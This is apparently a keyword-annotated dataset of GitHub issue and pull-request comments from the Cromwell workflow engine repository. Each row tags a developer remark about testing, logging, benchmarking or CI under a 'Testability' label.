Testability,"@illusional. I did some benchmarking on xxh64sum vs md5sum on a 35GB file. Results:; * Just reading the file with `cat <file> /dev/null` took 18 seconds. Virtually no CPU time; * xxh64sum took 24 seconds of which 3.6 seconds cpu time; * md5sum took 53 seconds, of which 48 seconds cpu time. Md5sum was cpu limited. So CPU was 100% all the time. xxh64sum was limited by the transfer speed of the disk (nvme ssd), so cpu usage never exceeded 20%. This means the bottleneck becomes I/O based, and for 200 GB files on NFS this can indeed be a big problem. I have added a `hpc` strategy` that takes the last modified time, size, and the xxh64sum of the first 10 megabytes of the file to alleviate this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129:24,benchmark,benchmarking,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129,1,['benchmark'],['benchmarking']
Testability,"@illusional. I renamed the strategy `fingerprint` because I think it can be used in a general case. Also because it is called ""fingerprint"" it does carry with it the sense that it only tests a small part of the file, and is therefore less reliable than a strategy that hashes the entire file. (Even though it should be reliable enough). To build a new jar, check out the [documentation](https://cromwell.readthedocs.io/en/stable/developers/Building/). It is as easy indeed as checking out the branch and running `sbt assembly`. It might take a while though. If you run out of memory I believe sbt has a `-mem` flag to set the memory. @cjllanwarne I fully agree with your comments on the documentation part, so I trimmed the changelog and moved the information to the documentation. I hope the documentation is adequate and well-explained enough.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307:185,test,tests,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599539307,1,['test'],['tests']
Testability,@iyanuobidele can you please pull it and try one more round of integration testing with the Spark cluster ? ; @geoffjentry : I rebased it with the develop branch let me know how does it look ? I will merge it then. Thank you.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1339#issuecomment-243985512:75,test,testing,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1339#issuecomment-243985512,1,['test'],['testing']
Testability,"@jacarey @vivster7 Just as a sanity check, I'm assuming you all actually tested this for realz, right? i.e. not just unit tests? . 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/842/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184:73,test,tested,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/842#issuecomment-220619184,2,['test'],"['tested', 'tests']"
Testability,"@jainh I think you need to rebase, my suspicion is that the test failures are due to not being quite up to date on develop. Also, not for this PR but I'd suggest looking into porting this backend to the standard backend trait, it might help wiht these divergences in the future",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2619#issuecomment-329019729:60,test,test,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2619#issuecomment-329019729,1,['test'],['test']
Testability,@jdidion I didn't receive an email address from you so I didn't manually add you. You should be able to sign up with a gmail account. Full access sometimes is delayed so you may need to try and log in again later.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927:194,log,log,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510059927,1,['log'],['log']
Testability,"@jgainerdewar Latest updates [here](https://github.com/broadinstitute/cromwell/pull/7000). Note that the error in the CI build seems to be a test error related to call caching, and way above that in the build spew there were notifications about not having access to `ubuntu:latest`. Not sure if those two observations are related. I also don't know if the build/test failures are related to the fact we haven't merged the latest changes from `develop` into this PR yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995:141,test,test,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6980#issuecomment-1416720995,2,['test'],['test']
Testability,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:464,test,tests,464,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142,4,['test'],"['test', 'tests']"
Testability,"@jsotobroad I believe the integration tests you set up for Green are covered by this ticket, do you agree?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2112#issuecomment-329666247:38,test,tests,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2112#issuecomment-329666247,1,['test'],['tests']
Testability,"@jsotobroad I haven't run this at scale on JES, but with some small local tests I'm pretty sure that's the reason why scatter collection is so slow with call caching on.; We basically re-compute hashes for all the elements in the array when the shards are collected...; I ran without and with this fix and scatter collection went from ~75ms to ~2ms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170:74,test,tests,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/853#issuecomment-220192170,1,['test'],['tests']
Testability,"@katevoss As @mcovarr alludes to, this is a spiritual cousin of that ignored test ticket. A holdover from a time long enough past that the likelihood of any ticket still mattering closely approximates zero. @mcovarr ; ![images](https://user-images.githubusercontent.com/961771/29590873-106c9d7e-876a-11e7-94bc-2fb749479b5e.jpg)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1336#issuecomment-324172419:77,test,test,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1336#issuecomment-324172419,1,['test'],['test']
Testability,"@katevoss Good examples would be GOTC or Firecloud, where they expend effort to test things before incorporating a new version into their system. It often happens that we discover that and tell them ""we already test X"", but they have no way of knowing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-325661432:80,test,test,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-325661432,2,['test'],['test']
Testability,"@katevoss I haven't tried it. If there is a test that has declarations in a scatter then I'm happy with closing this. I'm sure I was running into some other issue, including what @cjllanwarne mentioned above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-287464356:44,test,test,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-287464356,1,['test'],['test']
Testability,"@katevoss I'm one of the developers of Singularity and I would like to +1 this request! I don't know scala, but if it comes down to making an equivalent folder [like this one for Docker](https://github.com/broadinstitute/cromwell/tree/9aff9f2957d303a4789801d6a482777faf47d48f/dockerHashing/src/main/scala/cromwell/docker) I can give a first stab at it. Or if it's more helpful I can give complete examples for all the steps to working with singularity images. We have both a registry ([Singularity Hub](https://singularity-hub.org) that is hooked up to the singularity command line client to work with images. So - to integrate into cromwell you could either just run the container via a singularity command, or implement your own connection to our API to download the image. Please let me know how I might be helpful, and I'd gladly help. If you want me to give a go at scala I would just ask for your general workflow to compile and test functionality.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-295935968:935,test,test,935,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-295935968,1,['test'],['test']
Testability,"@katevoss I've re-tested with release 29 and this works as expected now — and may have been working for some time, I haven't revisited this for a while. Thanks to all for the fix.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1702#issuecomment-331019025:18,test,tested,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1702#issuecomment-331019025,1,['test'],['tested']
Testability,"@katevoss I've said that it is not useful for quite some time now. Every time I bring it up other people disagree with removing it. Yes, there are still ignored tests but I'm using the model of ""if you haven't touched it by now it's not useful and you're never going to come back to it"". . I'd suggest we set a TTL for this ticket and anyone who feels strongly about these tests can effort to enable them between now and then.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1149#issuecomment-320693216:161,test,tests,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1149#issuecomment-320693216,2,['test'],['tests']
Testability,"@katevoss could I ask you to vet the RTD changes that I've made? . I also think you'd be a valuable litmus test for ""how much does this documentation make sense"" since you know Cromwell well but don't know (yet!) how this specific feature is going to work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4130#issuecomment-423319935:107,test,test,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4130#issuecomment-423319935,1,['test'],['test']
Testability,"@katevoss going with a suggestion I got from @LeeTL1220 I just tested running this with a local backend, not using docker, and that works. The issue is that it doesn't work for docker. Doesn't that imply that this is a bug rather than a feature request, as it has been implemented, just not with the docker runtime?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-288066284:63,test,tested,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-288066284,1,['test'],['tested']
Testability,"@katevoss nope, this is just making a single test more reliable",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2908#issuecomment-344984174:45,test,test,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2908#issuecomment-344984174,1,['test'],['test']
Testability,"@katevoss, it not being available in FireCloud is my high-level issue - it turns out that since FireCloud currently implements Cromwell 28, [call_caching_placeholder.txt gets placed, even though it is actually cache-by-copy rather than reference](https://gatkforums.broadinstitute.org/firecloud/discussion/10282/confusing-file-left-in-call-cached-execution-directory). . This makes me believe that it should be trivial to leave a file or log entry with details of _why_ a call was cached, which would be quite useful to me, or anyone else trying to troubleshoot an unexpected occurrence like this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147:438,log,log,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147,1,['log'],['log']
Testability,"@kcibul I don't know. Because the ticket @mcovarr linked sounded like there was a magic setting somewhere I googled around a bit and found some references to badness. I didn't check, however. Still something to look at. Also I've been using MySQL not CloudSQL, perhaps that matters. I got to the point where if I set my batch size high enough (I was generating on the order of ~15k events to write per second, FWIW) my overall performance was such that I was getting a sustained rate of ~1500-1700 (I forget exactly) requests per second on the submission side, which is certainly still a lot less than I was getting w/o metadata at all but a heck of a lot better than I was able to do otherwise. It's entirely possible that all I did was move the goalpost back and that if I extended my test even further eventually I'd see the same problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705:787,test,test,787,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705,1,['test'],['test']
Testability,@kcibul This is important. I was testing to see if the new release fixed the hanging issue previously reported #1649,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265341832:33,test,testing,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1754#issuecomment-265341832,1,['test'],['testing']
Testability,"@kcibul This might deserve a 0.21_hotfix ? Currently the run time resources are empty (except for the noAddress flag), so they override some (apparently not all) of the attributes. I did a couple tests and it overrides preemptibility but not zone for example...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-250539095:196,test,tests,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1507#issuecomment-250539095,1,['test'],['tests']
Testability,"@kcibul e.g. `callName-2-stdout.log` Though there are no tests for this specifically, I can probably add one soon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-171776989:32,log,log,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/378#issuecomment-171776989,2,"['log', 'test']","['log', 'tests']"
Testability,@kcibul next time I won't update tests or docs to keep the file count down ;),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-267825669:33,test,tests,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-267825669,1,['test'],['tests']
Testability,"@kcibul when or why would a Cromwell user want to know what Centaur is testing? Is this a Cromwell user who is going direct to Cromwell, or via some other portal?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-325659139:71,test,testing,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-325659139,1,['test'],['testing']
Testability,"@knoblett Haven't you already filed a similar issue before?. Long story short: We have a plan, it's unlikely to happen in the near future. Because there are so many different requests for how logging should be handled and they can't all happen in a single log we'll be providing multiple logs each catered do different archetypical user/operator personas. I suggest you chat with @katevoss when she gets back, we had talked about her setting up some focus groups involving the different sorts of people so we can start refining what these various logs would actually be",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-282744845:192,log,logging,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-282744845,4,['log'],"['log', 'logging', 'logs']"
Testability,@kpierre13 It looks like framework for test for this file already exists. You should be able to add new test here - [SwaggerUiHttpServiceSpec](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/test/scala/cromwell/webservice/SwaggerUiHttpServiceSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026:39,test,test,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6552#issuecomment-956539026,3,['test'],['test']
Testability,@kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; - GET `/runs/{workflowId}/status`; - POST `/runs/{workflowId}/cancel`; - GET `/service-info`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823:17,test,tests,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823,3,['test'],['tests']
Testability,"@kshakir ; > Does this still mean that all other backend implementations should still look for cwl.output.json as a glob and not a regular file?. I think `cwl.output.json` should be looked at as an ""optional output"". At least for delocalization purposes (since the actual file is never used as is.. I think..). With PAPI V2 we should be able to support optional outputs and so when that happens we should switch from using a glob based approach to an optional approach. For backends that can't support optional outputs for whatever reason, the glob way is still viable IMO.; This is not to say that we don't need a larger glob refactoring, but we've been using glob as a workaround for optional outputs in some cases because of restrictions of V1 that I think we should not impose on V2, or any backend that can deal cleanly with optional outputs. > As the conformance tests are being removed, does that infer that as of this PR is CWL not officially supported on PapiV1?. yes I think there's no official plan to support CWL on V1 (@geoffjentry is that true ?) Since this particular test can only work on V2, instead of duplicating the `papi_conformance_expected_failures.txt` file with a V1/V2 I took the opportunity to nix V1 from travis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3619#issuecomment-389320386:869,test,tests,869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3619#issuecomment-389320386,2,['test'],"['test', 'tests']"
Testability,"@kshakir As per my understanding, `eventually` was the one that was timing out. When I tested it last week with several builds, the test did not fail in any of them. And I had observed that when I decreased the span scale factor, it started failing again. Maybe there are other timeouts failing the test as well. I will try and add println-debugging.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752:87,test,tested,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430417752,3,['test'],"['test', 'tested']"
Testability,"@kshakir Beyond unit tests, how was this tested? It'd be good to try to throw this at some live mysql installations of various configurations to make sure it doesn't blow up",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2572#issuecomment-324406500:21,test,tests,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2572#issuecomment-324406500,2,['test'],"['tested', 'tests']"
Testability,"@kshakir Cool. I forgot that there were two types of tests, was asking about the conf one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1949#issuecomment-277409975:53,test,tests,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1949#issuecomment-277409975,1,['test'],['tests']
Testability,@kshakir Do you mean a mock-mock or a simple stub? I like the latter but find the former to be meh.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160984769:23,mock,mock-mock,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160984769,4,"['mock', 'stub']","['mock-mock', 'stub']"
Testability,@kshakir I _think_ I've now got this generalized across all backends (I tested this with local and with PAPIv2). I'd definitely appreciate comments on whether I picked the right level of abstraction in the `XyzBackendJobExecutionActor` inheritance hierarchy to insert the change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4872#issuecomment-485964920:72,test,tested,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4872#issuecomment-485964920,1,['test'],['tested']
Testability,@kshakir I _think_ this covers your points although the test refactor isn't quite what we were talking about on hipchat. I think to go the route I think you were describing would be tough.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/158#issuecomment-136456530:56,test,test,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/158#issuecomment-136456530,1,['test'],['test']
Testability,"@kshakir I just made the following changes:. - SBT is now run on pushes, to make sure that the artifact publishing still happens. Since it's ~30 minutes, not dependent on external services, and less flaky than the other tests I still think this is an improvement over today; - I switched the syntax to `[force ci]`. See the most recent commit message and it triggering the tests to run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4839#issuecomment-485822757:220,test,tests,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4839#issuecomment-485822757,2,['test'],['tests']
Testability,@kshakir I like the spirit of your comment but don't understand the exact intent. Do you have specific test coverage in mind beyond the four variants of `shouldBeProblematic` we have now?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4095#issuecomment-422480676:103,test,test,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4095#issuecomment-422480676,1,['test'],['test']
Testability,"@kshakir I migrated the old CROM-2620 ticket to our new Jira project, you should be good to merge once tests finish.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6741#issuecomment-2105115430:103,test,tests,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6741#issuecomment-2105115430,1,['test'],['tests']
Testability,@kshakir I want to tech talk on this a bit prior to merging. I think it's fine as-is but want to make sure we think through the nuance and/or logical next steps,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-181055960:142,log,logical,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-181055960,1,['log'],['logical']
Testability,"@kshakir One simple possibility for batching that would work for LSF and SLURM (not sure about other schedulers) would be to query the scheduler for all user jobs that are currently running, then compare this to the expected running jobs. The output for multiple jobs is very similar to that for a single job, so parsing should not be much harder. . - On LSF, ~~`check-alive = ""bjobs ${job_id}""`~~ would be replaced by `check-alive = ""bjobs""`.; - On SLURM, ~~`check-alive = ""squeue -j ${job_id}""`~~ would be replaced by `check-alive = ""squeue -u ${user}""`. This scales better but would remove the ability to test for single jobs, but it sounds like this isn't used anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328984482:608,test,test,608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328984482,2,['test'],['test']
Testability,@kshakir Tests involving talking to google are explicitly mentioned in DSDEEPB-828 - I think it's fair to push it off to that (doubly so considering that unit tests should never talk to external services and that's all we have at the moment),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124134500:9,Test,Tests,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124134500,2,"['Test', 'test']","['Tests', 'tests']"
Testability,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:218,test,testing,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627,10,['test'],"['test', 'testing', 'tests']"
Testability,@kshakir Thanks for taking time to provide comments. Will checkin tests for the fix in a day or two. Sorry for not doing it earlier.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-763229794:66,test,tests,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-763229794,1,['test'],['tests']
Testability,@kshakir That list is used to provide a warning in the log if you specify a key that isn't used. I'd prefer to either do away w/ the warning or find some way to force the config keys we use and this list to be the same but I figured my fellow cromwellians would balk at the former and I couldn't think of a non-annoying way to do the latter.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1749#issuecomment-265312580:55,log,log,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1749#issuecomment-265312580,1,['log'],['log']
Testability,"@kshakir The pieces I put in are as well tested as their siblings and they'll remain that way as this PR, so Codecov can remain unhappy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2936#issuecomment-347252970:41,test,tested,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2936#issuecomment-347252970,1,['test'],['tested']
Testability,"@kshakir adding `-elocaldockertest` addressed the issue when I ran the tests locally. In Travis CI, the `non_root_default_user` test is failing with:. ```; Status: Downloaded newer image for mcovarr/notroot:v1; bin/bash: /cromwell-executions/woot/148f812b-028b-4264-82bd-ab2f089efe98/call-notroot/execution/script: Permission denied; ```. This test passes when I run it locally. Any ideas?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-279779906:71,test,tests,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-279779906,3,['test'],"['test', 'tests']"
Testability,@kshakir all TES Centaur tests are now passing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-280425784:25,test,tests,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1979#issuecomment-280425784,1,['test'],['tests']
Testability,"@kshakir exporting the factor (to `sbt`) does actually scale the timeout. I ran the test couple of times, and it hasn't failed so far. And upon adding println-debugging I did see the timeout being scaled by 10.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659:84,test,test,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430822659,1,['test'],['test']
Testability,"@kshakir helpfully notes:; >That error looks like JNI, that I suspect is jython related, thus is probably heterodon. Heterodon was slimmed down to remove everything NOT tested via mac and/or CI. So since we don’t have any :travis: / :jenkins: testing windows I would not expect heterodon to work. Good news (?): we still support shell invoking `cwltool`, but I have zero expectation for that to work on windows either... So this behavior is likely the result of a deliberate and helpful size optimization.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597:169,test,tested,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597,2,['test'],"['tested', 'testing']"
Testability,"@kshakir huh, TIL. It currently passes **most** of the centaur tests, maybe I can square that away in a separate PR as we should be running as many as possible. What's weird is that `long_cmd` fails consistently for me but looks to be on the good list.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473119369:63,test,tests,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473119369,1,['test'],['tests']
Testability,"@kshakir re: _issue where String outputs will attempt to be deleted_, I think I have covered this case. String outputs are stored as `WomString` even if they contain a file path. And such outputs should be eliminated [here](https://github.com/broadinstitute/cromwell/blob/180c64ab265e763528b66b945a584191d886020f/engine/src/main/scala/cromwell/engine/workflow/lifecycle/deletion/DeleteWorkflowFilesActor.scala#L82-L89). I have covered that test case [here](https://github.com/broadinstitute/cromwell/blob/180c64ab265e763528b66b945a584191d886020f/engine/src/test/scala/cromwell/engine/workflow/lifecycle/deletion/DeleteWorkflowFilesActorSpec.scala#L172-L209). Am I missing some other scenario?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5302#issuecomment-560557658:440,test,test,440,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5302#issuecomment-560557658,2,['test'],['test']
Testability,"@kshakir sounds good. I seem to have more trouble with the metadata tests, but I'm pretty sure I've experienced issue with the scatter WDL too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153547121:68,test,tests,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153547121,1,['test'],['tests']
Testability,@kshakir was this fixed with your latest changes to logging?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/345#issuecomment-194320914:52,log,logging,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/345#issuecomment-194320914,1,['log'],['logging']
Testability,@kshakir would it change your mind about the Centaur test to know the cases in `WomTypeSpec.scala` successfully detect the issue at a unit level?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082:53,test,test,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4324#issuecomment-433928082,1,['test'],['test']
Testability,"@kshakir, thank you for your detailed explanation. If you do not mind, could you please shed some light on the one more thing.; I have a little bit messy with the definition of what the default credentials are.; Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed? In my point of view, it looks insecure to pass my keys and AWS environments for CI testing. This is why I think that I missed something. Also, in case if I suggest a fix for this task I will not be able to check the results of CI testing by myself cause I do not have access to the Jenkins. Is it possible to get access in read-only mode or I can communicate with someone who can provide testing results?. Thank you in advance for your answers!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413:371,test,tests,371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-504776413,4,['test'],"['testing', 'tests']"
